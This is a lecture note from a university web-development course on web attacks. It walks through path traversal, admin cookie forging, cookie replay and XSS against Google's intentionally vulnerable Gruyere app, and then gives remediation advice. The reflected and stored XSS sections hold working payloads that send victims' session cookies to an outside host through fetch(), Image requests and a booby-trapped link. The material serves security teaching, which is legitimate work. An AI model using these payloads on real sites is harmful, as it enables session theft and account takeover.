CS2610 - Wednesday, December 07 - Lecture 40 - Module 6

# Topics:
* [Announcements](#announcements)
* [Mudcard quiz](#mudcard-quiz)
* [Path traversal attacks](#path-traversal-attacks)
* [White box hacking](#white-box-hacking)
* [Cookie Replay Attack](#cookie-replay-attack)
* [Learning XSS with a pretend webapp (continued)](#learning-xss-with-a-pretend-webapp-continued)
* [Can XSS happen on Django](#can-xss-happen-on-django)
* [How To Build a Successful Career In Cybersecurity](#how-to-build-a-successful-career-in-cybersecurity)


------------------------------------------------------------
# Announcements

## Free Software and Linux Club

*   **What**  Hacker Movie Night
*   **When**  6:30pm Wednesday, December 7th
*   **Where** ESLC 053

This Wednesday we'll be hosting the traditional end-of-semester movie night. There will be snacks involved, but also feel free to bring your own if you'd like to share :).


## 2022 SANS Holiday Hack Challenge & KringleCon

*   **What**  Online cybersecurity conference and hacking challenge
*   **When**  Now open, through January 6th
*   **Where** https://www.sans.org/mlp/holiday-hack-challenge/

Join the global cybersecurity community in its most festive cyber security challenge and virtual conference of the year. The SANS Holiday Hack Challenge is a FREE series of super fun, high-quality, hands-on cybersecurity challenges. The SANS Holiday Hack Challenge is for all skill levels, with a stellar prize at the end for the best of the best entries.


## BSidesSLC 2022

*   **When**  Friday, December 16th
*   **Where** [Conference Center at Miller Campus](https://millerconfctr.com/venues/karen-gail-miller-conference-center/)
    *   BSidesSLC is a non-profit, 501(c)(3) run, conference focused on cybersecurity.
    *   At this conference you can expect to meet & network with industry experts, many of whom are located throughout Utah.
    *   General Admission (GA) @ $19.00 + tax & fees



# Action Items

*   **Reminder:** graded Mastery Quizzes must be completed by **11:59pm Sunday, December 11th**
*   **Reminder:** graded Canvas discussions will be closed at **11:59pm Sunday, December 11th**
*   Call on 2 designated questioners




# Mudcard quiz

Take a minute and answer the following questions on your mudcard.  Either email
a picture of your mudcard or type your answers to erik.falor@usu.edu.

* What is a red team?
* What is a blue team?
* What is a black hat?
* What is a white hat?
* What is your best defense against a hacker?
* What are the three truths you must embrace?


<details>
<summary>Don't peek!</summary>

[Computer Security Concepts]( ../CyberSec-Getting_Started.md#computer-security-concepts)

## If you accept the risks...

0. Ask yourself if you *really* need to run a service.  The more software you expose to the internet, the more vulnerable you are.
1. Read all of the documentation and follow best security practices
2. Decide how this software will fit in with your existing systems
3. Follow the vendor's news and apply patches ASAP

</details>



# Path traversal attacks

In addition to posting code snippets, you can also upload files to your Gruyere profile.  If you sit down and work through the Gruyere challenges (did somebody say *winter break project*?), you'll find that this opens up a whole new way to launch XSS attacks on this webapp.

*   After posting a file Gruyere tells you which URL to use to visit it.
*   A little birdie told me there is a file called `secret.txt` on Gruyere...  It's not in anybody's directory, though.  I wonder if you can climb out of your home directory?
    *   Hmm, it seems that somebody at Gruyere thought about this and blocks URLs that contain the characters `.` and `/`.
    *   Is there any other way to write a relative path in a URL?

<details>

*   Consult an ASCII table and discover that `.` is ASCII char `2E` and `/` is `2F`.
    *   Recall that URL encoding works by concatenating `%` with hex digits
    *   Try again by appending `%2e%2e%2fsecret.txt` to the URL

</details>



# White box hacking

After having a look at `secret.txt`, I wonder what it's used for...

We can read the server's source code at
https://google-gruyere.appspot.com/code/?gruyere.py. Look for references to
`secret.txt` and see where that leads us.

*   Go to https://google-gruyere.appspot.com/code/?gruyere.py and read the source code, looking for `'secret.txt'`
*   Follow the variables involved as they are used throughout the code to see what important things they impact.

<details>

<summary>Hints</summary>

*   `'secret.txt'` is used in a global constant `SECRET_FILE`
*   `SECRET_FILE` is read to initialize `cookie_secret`
*   `cookie_secret` is used to form a cookie from 3-parts of text separated by
    pipes in a function named `_CreateCookie`
*   Scroll down a little farther and read `_ParseCookie` - it sets the ADMIN
    flag WITHOUT consulting the database!
    *   Study the code in this function a little bit, lines 640-647.  The Dict
        it returns sets bools based on the fields split from the cookie, where
        `values[1] == 'admin'` and `values[2] == 'author'`.  These string
        literals come from the request itself!
*   Wait a sec, what do my cookies look like?
*   Examine Cookies in **Storage** and notice the format
*   Gruyere is a little old and was written in Python2
    *   Open a Python2 REPL, set up variables, and paste the hashing code from
        gruyere.py:
        ```python
        cookie_data = 'jimmy||author'
        cookie_secret = 'Cookie!\n'
        str(hash(cookie_secret + cookie_data) & 0x7FFFFFF)
        ```
    *   That's the number at the front of my cookie!
    *   Add `'admin'` in between the middle pipes of `cookie_data` & Re-hash, saving to `h_data`:
        ```python
        cookie_data = 'jimmy|admin|author'
        hashed = str(hash(cookie_secret + c_data) & 0x7FFFFFF)
        hashed + "|" + cookie_data
        ```
*   Navigate to the **Profile** page; this page looks different when you're an admin ad
    *   Clear extra paths from URL (so you don't automagically log yourself out)
    *   Replace the existing cookie with this new value
    *   Refresh, ét voila

</details>


## The moral of the story

*   Regard session cookies as user-supplied input, and treat them with the same level of skepticism
    *   Don't use a session cookie to record access permissions, as they can be modified by an attacker
    *   Correlate a session cookie to a trustworthy record in your database
        *   Unless *that* record came from user-supplied input...
*   The availability of source code may accelerate an attack like this
    *   On the same token, a security researcher might catch this and inform you, too
*   A code-audit performed by a qualified security analyst should have caught this vulnerability before it became public



# Cookie Replay Attack

After reading the source code for the Gruyere server we saw that the cookies aren't actually stored in a database.

This isn't terribly realistic, but it does suggest a new avenue of attack: what happens if we supply an admin's cookie *after* resetting the system?

*   Click "Manage this server" and reset the server
*   Try to log in as "jimmy", it'll fail b/c he no longer exists

Now what?

<details>

<summary>Remember, that the cookie is parsed *WITHOUT* consulting the database</summary>

*   Replace my now-blank GRUYERE cookie with the value from Python2
*   Clear extra paths from URL (so I don't automagically log myself out)
*   Refresh, ét voila; I'm logged-in as a non-existent admin

</details>



# Learning XSS with a pretend webapp (continued)


## Reflected XSS

> In a reflected XSS attack, the attack is in the request itself (frequently the URL) and the vulnerability occurs when the server inserts the attack in the response verbatim or incorrectly escaped or sanitized. The victim triggers the attack by browsing to a malicious URL created by the attacker. 

This kind of attack was recently used against users of UPS.com.

*   The story on [BleepingComputer](https://www.bleepingcomputer.com/news/security/phishing-campaign-uses-upscom-xss-vuln-to-distribute-malware/)
*   Daniel Gallagher's [tweet](https://twitter.com/DanielGallagher/status/1429794038463479813)

Recall that reflected XSS is when we encode instructions into a URL.  This
crafted URL could come to you as a link in a spam email, or it could be
placed on another site waiting for unsuspecting users to click on it.

This attack hinges on the site taking data from the address and incorporating
it into the body of the document somehow.  On an unrelated note, I wonder what
happens when we try to visit a non-existent page on Gruyere?

+ In the URL bar, delete any '#' character and text that may follow it
+ Append something else to the URL, like `1+1 = 2` or `<h2>hello</h2><h1>world</h1>`

Notice that the error message includes whatever junk we put into the URL.
That's a curious thing about the HTML tags being rendered.  I wonder what
happens if we put a `script` tag in there?

    <script>alert(document.cookie)</script>

Instead of annoying the user with a pop-up box which will scare them, let's try
to inject a script which will send them (and their cookie) to a website I
control.  If I can trick people into visiting

    http://unnovative.net/cookie=...

I could collect information that may be used to impersonate them on this site.

+   In the URL bar, append this code to the address
    ```
    <script>fetch("http://unnovative.net/cookie="+document.cookie)</script>
    ```
+   Open the Network tab and see if the browser makes a request to unnovative.net

Oh good!  By some combination of the browser and this site, I cannot simply use
the `fetch()` API to surreptitiously steal their session cookie.  It's a
*really* good thing that there are absolutely no other ways to make a browser
perform a GET request.

    <script>i=new Image();i.src="http://unnovative.net/cookie="+document.cookie</script>

Oh, forgot about that one...


+   "New Snippet"
+   Input this text into the `textarea`:
    ```
    <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#sec7"
        onmouseover="i=new Image(); i.src='http://unnovative.net/'+document.cookie"
        >Read the NIST guidelines for securing web app sessions</a>
    ```
+   Open a private Firefox window and visit the base Gruyere URL for my instance
+   Create a new user account and log in
+   Click **jimmy**'s *"helpful"* link
+   Review the server logs on the malicious server
+   Return to the original Firefox tab (**jimmy**'s account)
    +   Replace the session cookie
    +   Refresh the page

### Remediation

*   Sanitize *all* user input that appears on the page
    *   This extends even to the *URL* from the address bar; it comes from the user!
*   Validate data supplied by the user both in the **client** and on the **server**
    *   Client-side validation is a *nice-to-have* feature
    *   Don't rely solely on it, as the client is, after all, controlled by the attacker
*   Server-side validation is the only validation you can be sure of
    *   Even so, it's difficult to anticipate all possibilities
    *   Always to monitor server logs to be on the lookout for anomalies that point to weaknesses



# Can XSS happen on Django?

Does XSS work against the Django blog you created in Assignment 2?  Recall that
your Django blog accepts input from users in the form of comments to blog
posts.

Try these techniques on your own blog assignment and see if it's vulnerable!

Let's fire up a blog and see what we can get away with in the comment section

*   `hi &lt;h1&gt;there &lt;/h1&gt;`
*   `hi <span onmouseover="alert('yo mamma hovers!')">there</span>`


Django template variables automatically have sensitive HTML chars escaped:
https://docs.djangoproject.com/en/3.0/ref/templates/language/#automatic-html-escaping

By default in Django, every template automatically escapes the output of
every variable tag. Specifically, these five characters are escaped:

* `<` is converted to `&lt;`
* `>` is converted to `&gt;`
* `'` (single quote) is converted to `&#39;`
* `"` (double quote) is converted to `&quot;`
* `&` is converted to `&amp;`

To make XSS work in Django, you must disable this `autoescape` feature by
wrapping the relevant portion of the template in these tags:

    {% autoescape off %}
    {% endautoescape %}

Since you would have to go out of your way to do this, your blog is already
protected against XSS :)



# [How To Build a Successful Career In Cybersecurity](../CyberSec-Getting_Started.md#how-to-build-a-successful-career-in-cybersecurity)

Your most important qualification is merely having an interest in cybersecurity.



